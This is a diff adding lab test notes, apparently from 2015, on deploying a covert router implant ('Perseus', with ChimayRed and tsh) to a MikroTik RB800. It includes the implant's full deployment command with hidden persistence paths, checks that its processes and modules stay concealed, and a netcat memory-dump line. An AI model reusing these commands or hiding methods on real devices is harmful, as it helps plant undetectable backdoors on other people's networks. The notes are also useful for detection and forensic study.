@@ -1,0 +1,305 @@
+
+                        Owner: User #14587667
+DUT6 - RB800 - v1.2.0 Notes
+IP: 172.20.100.38/30
+VLAN: 620  (TOR6 gi1/0/14)
+ROS: 6.23
+Console Server Rack 6 Port 6
+LAN VLAN: 621  (TOR6 gi1/0/15)
+Tool Versions Used:
+ChimayRed 4.6.1
+TshPatcher 1.0.4
+Perseus 1.2.0
+Generate Perseus (from ICON3):
+cd /usr/bin/perseus_v1.2.0PERSEUS_BIN=perseus_1.2.0.4_routeros6_${TARGET_ARCH}.zipsudo python bin/${PERSEUS_BIN} -f /flash/rw/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /flash/etc/rc.d/run.d/S99tsh -d /flash/rw/hidden -p /flash/rw/tmp/tshd -S /flash/rw/hidden/startup -s 2 -r /flash/rw/hidden/dont_panic -P /ram/zero deploy_$PERSEUS_DEPLOY_VER
+Operator Notes:
+
+The "-m" option has been removed.
+The "-z" option has been replaced by "-P".
+The “-P” option is the location that the removal program should be written to when the removal procedure must be invoked. This path should be in a ramdisk.
+example: -P /ram/zero 
+
+
+
+Test timeline
+10/20/2015
+
+Configured WANWide Area Network and LANLocal Area Network interfaces.  Created ubuntu VMVirtual Machine #8 ot use as LANB host.
+Updated network diagram.
+Deployed Perseus 1.2.0
+Threw ChimayRed and uploaded tsh, 
+
+10/23/2015
+PS-25Spoke with User #77809 about the issue.  User #77810 was able to replicate it, but User #77809 could not replicate.  User #77811 is coming by DD2 for a meeting this afternoon and will bring the RB800 back with her for User #77809 to investigate.  The RB is currently in the erroneous state.Pr
+
+Tests to Run:
+mcc is visible
+
+
+ID
+Status
+Task
+
+
+1
+complete
+lsmod | grep mcc   # mcc will appear in list
+
+
+2
+complete
+ls /lib/modules/3.3.5     #no mcc
+
+
+3
+complete
+ls /ram/pckg                 #no mcc
+
+
+Inconsistent hiding
+
+
+ID
+Status
+Task
+
+
+4
+complete
+ls /sys/module | grep mcc       #mcc should be visible
+
+
+5
+complete
+ls /sys/kernel | grep mcc        # mcc should be hidden
+
+
+Check netstat for PID/Program name
+
+
+ID
+Status
+Task
+
+
+15
+complete
+bb netstat -p
+
+
+Check if kallsyms shows 'mcc' and its symbols
+
+
+ID
+Status
+Task
+
+
+16
+complete
+cat /proc/kallsyms | bb grep mcc
+
+
+Flux appears in firewall connections
+
+
+ID
+Status
+Task
+
+
+6
+complete
+/ip firewall connection print
+
+
+Sequential listing of /proc/pid reveals hidden directories. 
+
+
+ID
+Status
+Task
+
+
+7
+complete
+Run following script
+
+
+#!/bin/ash i=1 #echo "PIDs in /proc/" > proc_dirs while [ $i -lt 1000 ]; do         test -d /proc/$i && echo $i >> proc_dirs         i=$((i+1)); done bb ls -1v /proc > ls_dirs bb grep -Fxv -f ls_dirs proc_dirs 
+Check if connection is attempted to cloud.mikrotik.com
+
+
+ID
+Status
+Task
+
+
+8
+complete
+/system logging add action=echo topics=!ntp,!dhcp,!rip,!snmp
+
+
+Inspect Memory (before and after removing Perseus)
+Haven't figure out way to dump memory on PPC.
+
+
+ID
+Status
+Task
+
+
+9
+incomplete
+ICON: nc -l -p 9999 | dd bs=1048576 of=DUTX-ram.bin
+
+
+10
+incomplete
+Target: busbybox dd if=/dev/mem bs=1048576 count=1536 | bb nc 172.20.12.100 9999
+
+
+11
+incomplete
+Check for ELFs
+
+
+12
+incomplete
+Check if call tables were modified
+
+
+13
+incomplete
+Check mcc.ko for 'srcversion' string
+
+
+14
+incomplete
+
+Remove perseus and re-inspect memory for mcc unload
+
+
+
+Verify Files Hidden
+
+
+ID
+Status
+Task
+
+
+0
+complete
+bb ps ax | grep startup
+
+
+17
+complete
+bb ps ax | grep tsh
+
+
+18
+complete
+bb ps ax | grep flx
+
+
+Check if startup scripts appear when TAB pressed: No
+
+
+ID
+Status
+Task
+
+
+24
+complete
+cd /flash/etc/rc.d/run.d
+
+
+25
+complete
+ls <tab>
+
+
+Check that flux works at gateway
+
+
+ID
+Status
+Task
+
+
+19
+complete
+Set flux as gateway. Open browser and go to http://172.20.11.104/whatismyip.php and make sure it returns the IP of your flux node.
+
+
+ 
+
+
+ID
+Status
+Task
+
+
+20
+complete
+Reboot and check if processes still exist
+
+
+21
+complete
+Remove Perseus and inspect for remnants
+
+
+22
+complete
+Remove Peseus and check if current running tshd and flx are present
+
+
+23
+complete
+Re-attack if Perseus is already installed
+
+
+Perseus will self-delete  
+
+
+ID
+Status
+Task
+
+
+26
+complete
+Compare pre- and post-exploit CPU, memory, and disk usage
+
+
+
+system resource print
+system resource monitor
+
+
+Pre-Implant resource usage:                                              Post-Implant resource usage:
+
+Note: The disk space used is due to the large version of busybox that was uploaded.
+ 
+
+Attachments:
+
+
+image2015-11-3 13:43:17.png
+
+
+image2015-11-3 13:42:37.png
+
+
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+| 4 
+|
+                    
